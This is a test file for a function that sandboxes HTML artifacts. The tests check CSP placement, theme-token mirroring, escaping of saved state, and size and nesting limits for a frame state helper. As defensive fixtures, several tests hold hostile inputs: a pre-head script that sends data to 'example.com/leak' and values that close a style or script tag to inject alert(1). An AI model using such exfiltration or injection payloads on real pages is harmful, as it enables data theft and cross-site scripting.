import { describe, expect, test } from "bun:test";
import { runInNewContext } from "node:vm";
import {
	ARTIFACT_SIZE_MESSAGE,
	ARTIFACT_STATE_MAX_BYTES,
	ARTIFACT_STATE_MAX_DEPTH,
	ARTIFACT_STATE_MESSAGE,
	artifactSrcDoc,
} from "@/src/lib/artifact-srcdoc.ts";

interface FrameStateApi {
	get(): unknown;
	set(next: unknown): void;
}

// Runs the injected `window.ryu.state` helper in an isolated context, the way
// the sandboxed frame would, and records what it posts to the host.
function loadFrameStateApi() {
	const doc = artifactSrcDoc("html", "<p>page</p>") ?? "";
	const script = doc.match(/<script>(\(\(\)=>\{let saved=.*?)<\/script>/)?.[1];
	if (!script) {
		throw new Error("state helper script not found");
	}
	const posted: unknown[] = [];
	const frameWindow: { ryu?: { state: FrameStateApi } } = {};
	runInNewContext(script, {
		parent: { postMessage: (message: unknown) => posted.push(message) },
		TextEncoder,
		window: frameWindow,
	});
	const state = frameWindow.ryu?.state;
	if (!state) {
		throw new Error("state helper did not install window.ryu.state");
	}
	return { posted, state };
}

function nestedPageState(levels: number): Record<string, unknown> {
	let value: Record<string, unknown> = {};
	for (let level = 0; level < levels; level++) {
		value = { a: value };
	}
	return value;
}

describe("artifactSrcDoc", () => {
	test("places the network-denying policy before hostile pre-head scripts", () => {
		const marker = "HOSTILE_PRE_HEAD_SCRIPT";
		const doc = artifactSrcDoc(
			"html",
			`<!doctype html><script>${marker};fetch("https://example.com/leak")</script><html><head><title>x</title></head><body>ok</body></html>`
		);

		expect(doc).not.toBeNull();
		expect(doc?.indexOf("Content-Security-Policy")).toBeGreaterThanOrEqual(0);
		expect(doc?.indexOf("connect-src 'none'")).toBeGreaterThanOrEqual(0);
		expect(doc?.indexOf("Content-Security-Policy")).toBeLessThan(
			doc?.indexOf(marker) ?? -1
		);
	});

	test("wraps fragments with the same policy", () => {
		const doc = artifactSrcDoc("html", "<main>safe fragment</main>");
		expect(doc).toContain("Content-Security-Policy");
		expect(doc).toContain("<main>safe fragment</main>");
	});

	test("mirrors the app theme tokens into the sandbox", () => {
		const doc = artifactSrcDoc("html", "<div>chart</div>", {
			dark: true,
			tokens: { "--primary": "oklch(0.7 0.1 250)", "--radius": "0.5rem" },
		});
		expect(doc).toContain("--primary:oklch(0.7 0.1 250)");
		expect(doc).toContain("--radius:0.5rem");
		expect(doc).toContain("color-scheme:dark");
		expect(doc).toContain('<html class="dark">');
		// Tokens the host did not supply still resolve to a neutral fallback.
		expect(doc).toContain("--chart-1:");
	});

	test("refuses token values that could escape the style rule", () => {
		const doc = artifactSrcDoc("html", "<p>x</p>", {
			dark: false,
			tokens: { "--primary": "red}</style><script>alert(1)</script>" },
		});
		expect(doc).not.toContain("alert(1)");
		expect(doc).toContain("--primary:#171717");
	});

	test("full documents get tokens and the size reporter after the policy", () => {
		const doc =
			artifactSrcDoc(
				"html",
				"<!doctype html><html><head></head><body>page</body></html>"
			) ?? "";
		const policy = doc.indexOf("Content-Security-Policy");
		expect(policy).toBeGreaterThanOrEqual(0);
		expect(doc.indexOf("--background:")).toBeGreaterThan(policy);
		expect(doc.indexOf(ARTIFACT_SIZE_MESSAGE)).toBeGreaterThan(policy);
		expect(doc.indexOf(ARTIFACT_SIZE_MESSAGE)).toBeLessThan(
			doc.indexOf("page")
		);
	});

	test("embeds saved page state without letting it close the script", () => {
		const doc =
			artifactSrcDoc("html", "<p>game</p>", undefined, {
				score: 3,
				note: "</script><script>alert(1)</script>",
			}) ?? "";
		expect(doc).toContain(ARTIFACT_STATE_MESSAGE);
		expect(doc).toContain('"score":3');
		// The only closing script tags are the injected helpers' own.
		expect(doc).not.toContain("alert(1)</script>");
		expect(doc).toContain("\\u003c/script\\u003e");
	});

	test("a page with no saved state starts from null", () => {
		const doc = artifactSrcDoc("html", "<p>fresh</p>") ?? "";
		expect(doc).toContain("let saved=null;");
	});

	test("ryu.state.set measures UTF-8 bytes and throws instead of posting", () => {
		const { posted, state } = loadFrameStateApi();
		// Under the limit in UTF-16 code units, over it once encoded as UTF-8.
		const cjk = { note: "\u4e2d".repeat(22_000) };
		expect(JSON.stringify(cjk).length).toBeLessThan(ARTIFACT_STATE_MAX_BYTES);
		expect(() => state.set(cjk)).toThrow(/limited to/);
		expect(posted).toHaveLength(0);

		state.set({ score: 3 });
		expect(posted).toEqual([
			{ type: ARTIFACT_STATE_MESSAGE, state: { score: 3 } },
		]);
		expect(state.get()).toEqual({ score: 3 });
	});

	test("ryu.state.set refuses nesting Core would refuse once wrapped", () => {
		const { posted, state } = loadFrameStateApi();
		expect(() =>
			state.set(nestedPageState(ARTIFACT_STATE_MAX_DEPTH + 1))
		).toThrow(/levels of nesting/);
		expect(posted).toHaveLength(0);
		state.set(nestedPageState(ARTIFACT_STATE_MAX_DEPTH));
		expect(posted).toHaveLength(1);
	});
});
